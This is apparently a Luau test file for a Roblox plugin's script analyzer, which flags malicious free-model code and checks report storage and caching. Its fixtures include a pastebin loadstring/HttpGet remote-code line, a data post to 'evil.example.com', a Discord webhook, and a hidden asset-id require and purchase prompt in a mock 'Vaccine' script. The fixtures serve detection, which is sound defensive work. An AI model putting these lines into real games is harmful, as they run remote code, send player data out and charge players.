-- Analyzer.luau: pattern scanner internals, a whole mock game (report, saved in the place, reloaded, context for Claude,
-- staleness, path resolution, free-model scan, chunked storage). The real Analyzer runs on the DataModel mock.
local LC = ...
local T = LC.kit.new("analyzer")
local function check(cond, what)
	T.check(cond, what)
end

local M = LC.run("tests/mocks/datamodel.luau")
local tree = LC.modtree.new{ env = LC.env(M.globals()) }
local Analyzer = tree.load("Analyzer")
local new, service, V3, NR, CS, UD2, methods = M.new, M.service, M.V3, M.NR, M.CS, M.UD2, M.methods
local Color3, Enum, workspace, recordings = M.Color3, M.Enum, M.workspace, M.recordings
local game, task, os = M.game, M.task, M.os -- the fake ones the Analyzer sees (a clock that runs fast, a task.wait that yields)

local I = Analyzer._internal

-- tokens ----------------------------------------------------------------------------------------
local t = I.tokens("M1AttackHTTPService")
check(table.concat(t, " ") == "m1 attack http service", "tokens: " .. table.concat(t, " "))
check(table.concat(I.tokens("KillBrick_3"), " ") == "kill brick 3", "tokens killbrick")
check(I.matchWord({ pet = true }, "pets") and not I.matchWord({ pet = true }, "pe"), "plural")

-- comments keep positions -----------------------------------------------------------------------
local src = "local a = 1 -- wait(1)\n--[[ require(123456)\nmore ]] local b = wait(2)\nprint('x')"
local stripped = I.stripComments(src)
check(#stripped == #src, "strip keeps length")
check(not string.find(stripped, "require"), "block comment removed")
check(select(2, string.gsub(stripped, "wait", "")) == 1, "line comment removed, code kept")
local starts = I.lineIndex(src)
check(#starts == 4, "line count " .. #starts)
check(I.lineOf(starts, string.find(src, "print")) == 4, "lineOf")

-- scanSource ------------------------------------------------------------------------------------
local function scan(code, meta)
	meta = meta or { path = "ServerScriptService.Test", name = "Test", class = "Script", server = true, client = false, workspace = false }
	local out = {}
	I.scanSource(meta, code, out, nil)
	local kinds = {}
	for _, f in out do
		kinds[f.kind] = f
	end
	return kinds, out
end
local k = scan("local m = require(1234567890)\nm.start()")
check(k["security.require"] and k["security.require"].severity == "high" and k["security.require"].line == 1, "require id")
k = scan("require(0x1F2E3D)")
check(k["security.require"], "require hex")
k = scan("local x = require(script.Parent.Module)")
check(not k["security.require"], "require module ok")
k = scan("loadstring(game:HttpGet('https://pastebin.com/raw/abc'))()")
check(k["security.loadstring"] and k["security.exploit"] and k["security.http"], "loadstring + httpget + pastebin")
k = scan(string.rep("\\x41", 30))
check(k["security.obfuscated"], "hex escapes")
k = scan("local s = string.char(" .. string.rep("72,", 20) .. "72)")
check(k["security.obfuscated"], "string.char")
k = scan("game:GetService('MarketplaceService'):PromptPurchase(player, 123)", { path = "Workspace.Model.Part.Script",
	name = "Script", class = "Script", server = true, workspace = true })
check(k["security.purchase"] and k["security.purchase"].severity == "high", "hidden purchase")
k = scan("MarketplaceService:PromptGamePassPurchase(player, 123)", { path = "StarterGui.ShopGui.Buy.LocalScript",
	name = "LocalScript", class = "LocalScript", client = true, workspace = false })
check(not k["security.purchase"], "shop purchase ok")
k = scan("remote.OnServerEvent:Connect(function(player, amount)\n\tplayer.leaderstats.Cash.Value += amount\nend)")
check(k["remote.unvalidated"] and k["remote.trust"], "remote trust + unvalidated")
k = scan("remote.OnServerEvent:Connect(function(player: Player, amount: number)\n\tif typeof(amount) ~= 'number' then return end\n"
	.. "\tplayer.leaderstats.Cash.Value += math.clamp(amount, 0, 10)\nend)")
check(not k["remote.unvalidated"] and k["remote.trust"], "validated remote still trusts value")
k = scan("remote.OnServerEvent:Connect(function(plr, code) loadstring(code)() end)")
check(k["remote.runsCode"], "remote runs code")
k = scan("while true do\n\tx = x + 1\nend\nwhile true do\n\ttask.wait(1)\nend")
local _, all = scan("while true do\n\tx = x + 1\nend\nwhile true do\n\ttask.wait(1)\nend")
local busy = 0
for _, f in all do
	if f.kind == "perf.busyLoop" then
		busy += 1
		check(f.line == 1, "busy loop line")
	end
end
check(busy == 1, "one busy loop, got " .. busy)
k = scan("wait(1) task.wait(1) spawn(f) task.spawn(f) delay(1, f) x:connect(f) Instance.new('Part', workspace) tick()")
check(k["deprecated.wait"] and k["deprecated.spawn"] and k["deprecated.delay"] and k["deprecated.connect"]
	and k["deprecated.instanceParent"] and k["deprecated.tick"], "deprecated")
check(k["deprecated.wait"].message == "wait() ×1 → task.wait()", "wait count only global: " .. k["deprecated.wait"].message)
k = scan("local p = game.Players.LocalPlayer")
check(k["code.localPlayerServer"], "LocalPlayer on server")
k = scan("local ds = DataStoreService:GetDataStore('x') ds:SetAsync(k, v)")
check(k["data.noPcall"], "datastore without pcall")
k = scan("local ok = pcall(function() ds:SetAsync(k, v) end) local s = DataStoreService:GetDataStore('x')")
check(not k["data.noPcall"], "datastore with pcall")
k = scan("HttpService:PostAsync('https://evil.example.com/log', data)")
check(k["security.http"] and string.find(k["security.http"].message, "evil.example.com", 1, true), "post unknown host")
k = scan("HttpService:PostAsync('https://discord.com/api/webhooks/1/abc', data)")
check(k["security.http"] and string.find(k["security.http"].message, "Discord", 1, true), "discord webhook")
k = scan("local x = '" .. string.rep("QUJD", 100) .. "'")
check(k["security.blob"], "base64 blob")
k = scan("print('" .. string.rep("a b ", 600) .. "')")
check(k["security.longLine"], "long line")
k = scan("local h = getfenv(0)")
check(k["security.fenv"] and k["security.fenv"].severity == "medium", "getfenv")
k = scan("hookfunction(print, warn)")
check(k["security.exploit"], "exploit api")

-- plain + chunks --------------------------------------------------------------------------------
local p = I.plain({ 1, 2, { a = Color3.new(1, 0, 0), [5] = true }, V3(1.234, 2, 3), Enum.Material.Plastic, 0 / 0 })
check(p[3].a == "FF0000" and p[3]["5"] == true and p[4].x == 1.23 and p[5] == "Plastic" and p[6] == 0, "plain")
local text = string.rep("ă", 10) .. "abc"
local parts = I.chunks(text, 3)
check(table.concat(parts) == text, "chunks roundtrip")
for _, part in parts do
	check(utf8.len(part) ~= nil, "chunk is valid utf8: " .. part)
end

-- a whole mock game -----------------------------------------------------------------------------
local Workspace = workspace
local workspaceMock = Workspace
local function part(name, props)
	local base = { Anchored = true, Size = V3(4, 1, 2), Position = V3(0, 0, 0), Color = Color3.fromRGB(163, 162, 165),
		Material = Enum.Material.Plastic, Transparency = 0, CanCollide = true }
	for k2, v in props or {} do
		base[k2] = v
	end
	return new(base.class or "Part", name, base)
end
new("Camera", "Camera", {}, { new("Model", "Preview", {}, { part("ShouldBeSkipped") }) }).Parent = Workspace
new("Terrain", "Terrain", {}).Parent = Workspace
part("Baseplate", { Size = V3(2048, 16, 2048), Position = V3(0, -8, 0), Color = Color3.fromRGB(91, 154, 76),
	Material = Enum.Material.Grass }).Parent = Workspace
local map = new("Model", "Map")
map.Parent = Workspace
for i = 1, 40 do
	part("Wall" .. i, { Color = i % 2 == 0 and Color3.fromRGB(200, 50, 50) or Color3.fromRGB(30, 30, 30),
		Material = Enum.Material.Brick, Position = V3(i * 4, 2, 0) }).Parent = map
end
for i = 1, 5 do
	part("Checkpoint" .. i, { class = "SpawnLocation" }).Parent = map
end
part("Crate", { Anchored = false }).Parent = map
part("KillBrick", { Color = Color3.fromRGB(255, 0, 0) }).Parent = map
local npc = new("Model", "Bandit", {}, { new("Humanoid", "Humanoid", { RigType = Enum.HumanoidRigType.R15 }),
	part("HumanoidRootPart", { Anchored = false }) })
npc.Parent = Workspace
local fx = part("Torch")
fx.Parent = map
new("ParticleEmitter", "Flames", { Enabled = true, Rate = 500, Lifetime = NR(1, 2), Texture = "rbxassetid://111",
	Color = CS(Color3.fromRGB(255, 120, 0), Color3.fromRGB(255, 0, 0)) }).Parent = fx
new("PointLight", "Light", { Shadows = true }).Parent = fx
local free = new("Model", "Free Model.v2")
free.Parent = Workspace
local fp = part("Part")
fp.Parent = free
new("Script", "Vaccine", { Source = "local x = require(4567891234)\nx.go()" }).Parent = fp
local decal = new("Decal", "Decal", { Texture = "rbxassetid://5" })
decal.Parent = fp
new("Script", "Script", { Source = "game.Players.PlayerAdded:Connect(function(p) "
	.. "game:GetService('MarketplaceService'):PromptPurchase(p, 1) end)" }).Parent = decal

local RS = service("ReplicatedStorage")
local lc = new("Folder", "LostCube", {}, { new("Folder", "Effects", {}, { new("Model", "Boom"), new("Model", "Fire") }),
	new("ModuleScript", "Editor", { Source = "wait(1)" }) })
lc.Parent = RS
local remotes = new("Folder", "Remotes", {}, { new("RemoteEvent", "Attack"), new("RemoteEvent", "BuyItem"),
	new("RemoteFunction", "GetData") })
remotes.Parent = RS
new("ModuleScript", "Knit", { Source = "return {}" }).Parent = RS
new("Animation", "SlashAnim", { AnimationId = "rbxassetid://987654" }).Parent = RS

local SSS = service("ServerScriptService", { LoadStringEnabled = false })
new("Script", "DataManager", { Source = "local DataStoreService = game:GetService('DataStoreService')\n"
	.. "local store = DataStoreService:GetDataStore('Main')\n"
	.. "game.Players.PlayerAdded:Connect(function(p)\n\tlocal ls = Instance.new('Folder')\n\tls.Name = 'leaderstats'\n"
	.. "\tlocal data = store:GetAsync(p.UserId)\nend)\n" }).Parent = SSS
new("Script", "Combat", { Source = "local RS = game:GetService('ReplicatedStorage')\n"
	.. "RS.Remotes.Attack.OnServerEvent:Connect(function(player, target, damage)\n"
	.. "\ttarget.Humanoid:TakeDamage(damage)\nend)\nwhile true do\n\tcount = count + 1\nend\n" }).Parent = SSS
new("Script", "Shop", { Source = "local MPS = game:GetService('MarketplaceService')\n"
	.. "RS.Remotes.BuyItem.OnServerEvent:Connect(function(player, id)\n\tMPS:PromptProductPurchase(player, 1234567)\nend)\n" }).Parent = SSS

local SG = service("StarterGui")
new("ScreenGui", "ShopGui", {}, { new("Frame", "ShopFrame", { Size = UD2(0, 500, 0, 400) }),
	new("Frame", "Inventory", { Size = UD2(0, 600, 0, 300) }), new("Frame", "Settings", { Size = UD2(0, 400, 0, 400) }),
	new("TextButton", "BuyButton", { Size = UD2(0.2, 0, 0.1, 0) }) }).Parent = SG
new("ScreenGui", "HUD", {}, { new("TextBox", "ChatInput", { Size = UD2(0.5, 0, 0, 30) }),
	new("Frame", "HealthBar", { Size = UD2(0.3, 0, 0.05, 0) }) }).Parent = SG

local SP = service("StarterPack")
local sword = new("Tool", "Sword", {}, { part("Handle"), new("LocalScript", "SwordClient", { Source =
	"local tool = script.Parent\ntool.Activated:connect(function()\n\twait(0.2)\n\tspawn(function() end)\n"
		.. "\tgame.ReplicatedStorage.Remotes.Attack:FireServer(target, 50)\nend)\n"
		.. "game:GetService('UserInputService').InputBegan:Connect(function(i) if i.KeyCode == Enum.KeyCode.Q then end end)" }) })
sword.Parent = SP

local StarterPlayer = service("StarterPlayer", { CharacterWalkSpeed = 16, CharacterUseJumpPower = true,
	CharacterJumpPower = 50, CharacterJumpHeight = 7.2, CharacterMaxSlopeAngle = 89, CameraMode = Enum.CameraMode.Classic,
	CameraMaxZoomDistance = 128, LoadCharacterAppearance = true, AutoJumpEnabled = true, EnableMouseLockOption = true })
new("StarterCharacterScripts", "StarterCharacterScripts", {}, { new("LocalScript", "Animate", { Source = "-- anim" }) }).Parent =
	StarterPlayer
new("StarterPlayerScripts", "StarterPlayerScripts").Parent = StarterPlayer

local Lighting = service("Lighting", { Technology = Enum.Technology.Voxel, ClockTime = 14, Brightness = 2,
	Ambient = Color3.fromRGB(70, 70, 70), OutdoorAmbient = Color3.fromRGB(128, 128, 128), GlobalShadows = true, FogEnd = 100000,
	FogColor = Color3.fromRGB(192, 192, 192), ExposureCompensation = 0, EnvironmentDiffuseScale = 1, EnvironmentSpecularScale = 1 })
new("ColorCorrectionEffect", "CC", { Brightness = 0, Contrast = 0.1, Saturation = 0.2, TintColor = Color3.new(1, 1, 1),
	Enabled = true }).Parent = Lighting
new("Script", "Spread", { Source = "print('hi')" }).Parent = Lighting

local SS = service("ServerStorage")
local saves = new("Folder", "RBX_ANIMSAVES")
saves.Parent = SS
local rig = new("ObjectValue", "Dummy")
rig.Parent = saves
local kfs = new("KeyframeSequence", "Punch1")
kfs.Parent = rig
local kf1 = new("Keyframe", "Keyframe", { Time = 0 }, { new("Pose", "HumanoidRootPart", {}, { new("Pose", "Torso") }) })
kf1.Parent = kfs
local kf2 = new("Keyframe", "Hit", { Time = 0.4 }, { new("KeyframeMarker", "Impact") })
kf2.Parent = kfs
new("Folder", "LostCubeSession").Parent = SS

service("Players", { CharacterAutoLoads = true, RespawnTime = 5, MaxPlayers = 10 })

-- run it inside a coroutine, like task.spawn in Studio
local labels = {}
local report
local co = coroutine.create(function()
	report = Analyzer.run(function(f, label)
		table.insert(labels, { f, label })
	end)
end)
local steps = 0
while coroutine.status(co) ~= "dead" do
	local ok, err = coroutine.resume(co)
	if not ok then
		T.fail("run error: " .. tostring(err))
		break
	end
	steps += 1
end
check(report ~= nil, "report")
if report then
	check(report.totals.errors == 0, "no visit errors: " .. tostring(report.totals.errors))
	check(labels[#labels][1] == 1 and labels[#labels][2] == "Gata", "progress ends at 1")
	local last = -1
	for _, l in labels do
		check(l[1] >= last, "progress monotonic " .. l[1] .. " " .. l[2])
		last = l[1]
	end
	-- skipped: camera content and LostCube folders
	for _, s in report.structure do
		for _, c in s.children do
			check(c.name ~= "Camera" and string.sub(c.name, 1, 8) ~= "LostCube", "skipped " .. c.name)
		end
	end
	check(report.vfx.lostCubeEffects == 2, "lostcube effects " .. report.vfx.lostCubeEffects)
	check(report.code.scripts == 6, "server scripts " .. report.code.scripts)
	check(report.code.localScripts == 2, "local scripts " .. report.code.localScripts)
	check(report.genre.key == "combat" or report.genre.key == "obby", "genre " .. report.genre.key)
	local kinds = {}
	for _, issue in report.issues do
		kinds[issue.kind] = issue
	end
	for _, want in { "security.require", "security.virusName", "security.oddPlace", "security.purchase", "data.noPcall",
		"data.bindToClose", "market.noReceipt", "perf.busyLoop", "rules.filter", "deprecated.wait", "deprecated.connect",
		"anim.rig", "ui.fixedSize" } do
		check(kinds[want] ~= nil, "issue " .. want)
	end
	check(report.issues[1].severity == "high", "high first")
	for _, issue in report.issues do
		if issue.line then
			check(issue.line <= 10, "line in range " .. issue.kind .. " " .. issue.line)
		end
	end
	check(report.avatar.rigType == "R15", "rig type " .. tostring(report.avatar.rigType))
	check(report.avatar.customAnimate == true, "custom animate")
	check(report.animations.kfs[1].rig == "R6" and report.animations.kfs[1].length == 0.4, "kfs")
	check(table.find(report.animations.kfs[1].markers, "Hit") and table.find(report.animations.kfs[1].markers, "Impact"), "markers")
	check(report.style.colors[1] ~= nil and report.style.bounds ~= nil, "style")
	check(report.performance.loose == 1, "loose parts " .. report.performance.loose)
	check(report.performance.shadowLights == 1, "shadow lights")
	check(#report.ui.categories > 0, "ui categories")
	local fwKnit = false
	for _, fw in report.code.frameworks do
		fwKnit = fwKnit or fw.name == "Knit"
	end
	check(fwKnit, "knit framework")
	check(#report.code.remotes == 3, "remotes " .. #report.code.remotes)

	-- saved in the place, loads back the same
	local folder = SS:FindFirstChild("LostCubeAnalysis")
	check(folder ~= nil and folder:FindFirstChild("Report") and folder:FindFirstChild("Context"), "saved")
	check(folder:GetAttribute("Version") == 1 and folder:GetAttribute("Chunks") == 1, "attributes")
	check(recordings.begun == recordings.finished and recordings.begun >= 1, "recording closed")
	local loaded = Analyzer.load()
	check(loaded ~= nil, "load")
	local c1, c2 = Analyzer.context(report), Analyzer.context(loaded)
	check(c1 == c2, "context same after load")
	if c1 ~= c2 then
		for i = 1, #c1 do
			if string.sub(c1, i, i) ~= string.sub(c2, i, i) then
				print("diff at", i, string.sub(c1, i - 80, i + 80), "\n---\n", string.sub(c2, i - 80, i + 80))
				break
			end
		end
	end
	check(folder.Context.Value == c1, "context stored")
	check(#c1 <= 15000, "context limit")
	local short = Analyzer.context(report, 1500)
	check(#short <= 1500 and string.find(short, "trunchiat", 1, true), "truncation " .. #short)
	check(utf8.len(short) ~= nil, "truncated context is valid utf8")

	-- AI
	Analyzer.setAI("## Analiză\nTotul bine.", "claude-test")
	local withAI = Analyzer.load()
	check(withAI.ai and withAI.ai.text == "## Analiză\nTotul bine." and withAI.ai.model == "claude-test", "ai saved")

	-- staleness
	check(not Analyzer.isStale(loaded), "fresh report not stale")
	local old = table.clone(loaded)
	old.at = os.time() - 8 * 24 * 3600
	check(Analyzer.isStale(old), "old report stale")
	local other = table.clone(loaded)
	other.version = 0
	check(Analyzer.isStale(other), "other version stale")

	-- resolve paths (with dots in names)
	local target = Analyzer.resolve("Workspace.Free Model.v2.Part.Vaccine")
	check(target ~= nil and target.Name == "Vaccine", "resolve with dots")
	check(Analyzer.resolve("Workspace.Nope") == nil, "resolve missing")

	-- free model check
	local findings
	local co2 = coroutine.create(function()
		findings = Analyzer.scanInstance(free)
	end)
	while coroutine.status(co2) ~= "dead" do
		assert(coroutine.resume(co2))
	end
	local fk = {}
	for _, f in findings do
		fk[f.kind] = true
	end
	check(fk["security.require"] and fk["security.virusName"] and fk["security.oddPlace"] and fk["security.purchase"],
		"scanInstance free model")

	-- big report: chunked storage
	local big = table.clone(loaded)
	big.filler = string.rep("ă", 120000)
	Analyzer.save(big)
	check(folder:GetAttribute("Chunks") >= 3, "chunks " .. tostring(folder:GetAttribute("Chunks")))
	local back = Analyzer.load()
	check(back and back.filler == big.filler, "chunked roundtrip")
	Analyzer.save(loaded)
	check(folder:GetAttribute("Chunks") == 1 and folder:FindFirstChild("Report2") == nil, "extra chunks removed")
	check(Analyzer.load().ai ~= nil, "ai kept after re-save")

	check(M.yieldCount() > 0, "the scan yielded to the frame budget (yields: " .. M.yieldCount() .. ", steps: " .. steps .. ")")
end

-- ---------------------------------------------------------------------------------------------
-- cache of the stored report, background instance counts, GetProductInfoAsync (needs the game built above)
-- ---------------------------------------------------------------------------------------------
T.section("report cache, isStale, place info", function()
	local function ok2(cond, what)
		T.check(cond, what)
	end
	-- mocks the base harness does not have
	local PENDING2 = {}
	task.defer = function(f, ...)
		local co = coroutine.create(f)
		local okc, err = coroutine.resume(co, ...)
		assert(okc, err)
		if coroutine.status(co) ~= "dead" then
			table.insert(PENDING2, co)
		end
	end
	local function drain2()
		local again = true
		while again do
			again = false
			for i = #PENDING2, 1, -1 do
				local co = PENDING2[i]
				if coroutine.status(co) == "dead" then
					table.remove(PENDING2, i)
				else
					again = true
					local okc, err = coroutine.resume(co)
					assert(okc, err)
				end
			end
		end
	end
	local decodes, dates, descendantCalls = 0, 0, 0
	local origDecode, origDate, origDesc = methods.JSONDecode, os.date, methods.GetDescendants
	methods.JSONDecode = function(a, b)
		decodes += 1
		return origDecode(a, b)
	end
	os.date = function(...)
		dates += 1
		return origDate(...)
	end
	methods.GetDescendants = function(o)
		descendantCalls += 1
		return origDesc(o)
	end

	local folder2 = SS:FindFirstChild("LostCubeAnalysis")
	local loaded = Analyzer.load()
	Analyzer.save(loaded)
	decodes = 0
	local a = Analyzer.load()
	local b = Analyzer.load()
	ok2(a ~= nil and a == b, "load returns the same table twice")
	ok2(decodes == 1, "decoded once, not per call: " .. decodes)
	dates = 0
	local c1 = Analyzer.context(a)
	local c2 = Analyzer.context(a)
	local c3 = Analyzer.context(a, 15000)
	ok2(c1 == c2 and c2 == c3 and dates == 1, "context built once for a loaded report: dates=" .. dates)
	local short1 = Analyzer.context(a, 2000)
	local short2 = Analyzer.context(a, 2000)
	ok2(#short1 <= 2000 and short1 == short2 and dates == 2, "context per maxChars cached: " .. dates)
	-- a table the caller owns is converted every time (its owner may have changed it)
	dates = 0
	local mine = table.clone(a)
	Analyzer.context(mine)
	Analyzer.context(mine)
	ok2(dates == 2, "private tables are not cached: " .. dates)
	-- context() with nil loads the stored report
	dates = 0
	ok2(Analyzer.context() == c1, "context(nil) = context of the loaded report")
	ok2(dates == 0, "context(nil) uses the cache")

	-- Claude's analysis changes: new table, same data, the old table untouched
	Analyzer.setAI("## nou", "model-x")
	local c = Analyzer.load()
	ok2(c ~= a and c.ai and c.ai.text == "## nou" and c.ai.model == "model-x", "ai change gives a new table")
	ok2(a.ai == nil or a.ai.text ~= "## nou", "the old table is not changed")
	ok2(c.code == a.code and decodes == 1, "nothing decoded again for an AI change: " .. decodes)
	ok2(Analyzer.load() == c, "stable again")
	-- somebody replaced report.ai by hand on the shared table: the next load repairs it
	c.ai = { text = "oops", model = "m", at = 1 }
	local c4 = Analyzer.load()
	ok2(c4.ai.text == "## nou", "a hand-edited ai field is repaired")

	-- text changed in place (Ctrl+Z, someone editing the StringValue)
	local reportValue = folder2:FindFirstChild("Report")
	local before = reportValue.Value
	local other = table.clone(loaded)
	other.at = (loaded.at or 0) - 5
	Analyzer.save(other)
	local d = Analyzer.load()
	ok2(d ~= c4 and d.at == other.at and decodes == 2, "changed text is decoded again: " .. decodes)
	-- the folder is deleted (undo of the first analysis) and later restored
	folder2.Parent = nil
	ok2(Analyzer.load() == nil, "no folder -> nil")
	local n = decodes
	folder2.Parent = SS
	local e = Analyzer.load()
	ok2(e ~= nil and e.at == other.at, "restored folder loads")
	ok2(decodes == n + 1, "restored folder decoded once more")
	-- a replaced folder with other data
	local clone2 = new("Folder", "LostCubeAnalysis")
	folder2.Parent = nil
	clone2.Parent = SS
	ok2(Analyzer.load() == nil, "empty replacement folder -> nil")
	folder2.Name = "old"
	clone2:Destroy()
	folder2.Name = "LostCubeAnalysis"
	folder2.Parent = SS
	ok2(Analyzer.load() ~= nil, "back")
	-- corrupt JSON: nil, and not decoded again and again
	reportValue.Value = "{not json"
	n = decodes
	ok2(Analyzer.load() == nil and Analyzer.load() == nil and Analyzer.load() == nil, "corrupt -> nil")
	ok2(decodes == n + 1, "corrupt text decoded once: " .. (decodes - n))
	reportValue.Value = before
	ok2(Analyzer.load() ~= nil, "valid again")
	Analyzer.save(loaded)
	-- chunked reports compare every chunk
	local big = table.clone(loaded)
	big.filler = string.rep("x", 250000)
	Analyzer.save(big)
	local bigLoaded = Analyzer.load()
	ok2(bigLoaded and bigLoaded.filler == big.filler, "chunked load")
	n = decodes
	ok2(Analyzer.load() == bigLoaded and decodes == n, "chunked report cached")
	folder2:FindFirstChild("Report2").Value = string.rep("y", 100000)
	ok2(Analyzer.load() ~= bigLoaded, "a changed second chunk is noticed")
	Analyzer.save(loaded)

	-- isStale: never walks the game itself ------------------------------------------------------------
	local realTime = os.time
	local offset = 0
	os.time = function(...)
		if select("#", ...) > 0 then return realTime(...) end
		return realTime() + offset
	end
	local fresh = Analyzer.load()
	descendantCalls = 0
	ok2(Analyzer.isStale(fresh) == false, "fresh report is not stale (counts from the scan)")
	ok2(descendantCalls == 0, "no instance walk while the counts are fresh")
	-- counts expire: the answer comes at once (age only), the walk happens later in the background
	offset = 4000
	local readyCalls = 0
	local function onReady()
		readyCalls += 1
	end
	descendantCalls = 0
	local stale1 = Analyzer.isStale(fresh, onReady)
	ok2(stale1 == false, "expired counts: answered from the old numbers")
	ok2(descendantCalls == 0 or #PENDING2 > 0 or readyCalls > 0, "count is deferred (not inside isStale)")
	-- (task.defer of the test mock runs the thread at once, so it may already be done; the call must not count twice)
	local before2 = descendantCalls
	Analyzer.isStale(fresh, onReady)
	Analyzer.isStale(fresh, onReady)
	drain2()
	ok2(readyCalls == 1, "ready callback called once: " .. readyCalls)
	ok2(descendantCalls > 0, "background count walked the game")
	local calls = descendantCalls
	Analyzer.isStale(fresh, onReady)
	drain2()
	ok2(descendantCalls == calls, "fresh counts again: no new walk")
	-- the game grew a lot: after the next background count the report is stale
	local grow = new("Folder", "Grown")
	grow.Parent = workspace
	for i = 1, 900 do
		new("Part", "G" .. i).Parent = grow
	end
	offset = 9000
	readyCalls = 0
	local stale2 = Analyzer.isStale(fresh, onReady)
	drain2()
	ok2(stale2 == false, "answer before the count is the age-only one")
	ok2(readyCalls == 1, "ready after growth count")
	ok2(Analyzer.isStale(fresh) == true, "stale after the game grew by 900 instances")
	grow:Destroy()
	-- age and version still answered without any count
	ok2(Analyzer.isStale({ version = 0, at = os.time() }) == true, "other version")
	ok2(Analyzer.isStale({ version = Analyzer.VERSION, at = os.time() - 9 * 24 * 3600 }) == true, "old")
	ok2(Analyzer.isStale(nil) == true, "nil")
	os.time = realTime
	methods.JSONDecode, os.date, methods.GetDescendants = origDecode, origDate, origDesc

	-- GetProductInfoAsync is preferred, GetProductInfo is the fallback ---------------------------------
	local asyncCalls, oldCalls = 0, 0
	local market = service("MarketplaceService")
	local origGetService = methods.GetService
	rawget(market, "_data").PlaceId = 0
	methods.GetProductInfoAsync = function(_, id)
		asyncCalls += 1
		return { Name = "Async game", Description = "d", Creator = { Name = "me" } }
	end
	methods.GetProductInfo = function(_, id)
		oldCalls += 1
		return { Name = "Old game", Description = "d", Creator = { Name = "me" } }
	end
	rawget(game, "_data").PlaceId = 123456
	local p1
	local co3 = coroutine.create(function()
		p1 = Analyzer.run(nil)
	end)
	while coroutine.status(co3) ~= "dead" do
		assert(coroutine.resume(co3))
	end
	ok2(p1 and p1.place.title == "Async game" and asyncCalls == 1 and oldCalls == 0, "uses GetProductInfoAsync: " .. tostring(p1 and p1.place.title))
	methods.GetProductInfoAsync = nil
	local p2
	co3 = coroutine.create(function()
		p2 = Analyzer.run(nil)
	end)
	while coroutine.status(co3) ~= "dead" do
		assert(coroutine.resume(co3))
	end
	ok2(p2 and p2.place.title == "Old game" and oldCalls == 1, "falls back to GetProductInfo: " .. tostring(p2 and p2.place.title))

end)

T.finish()
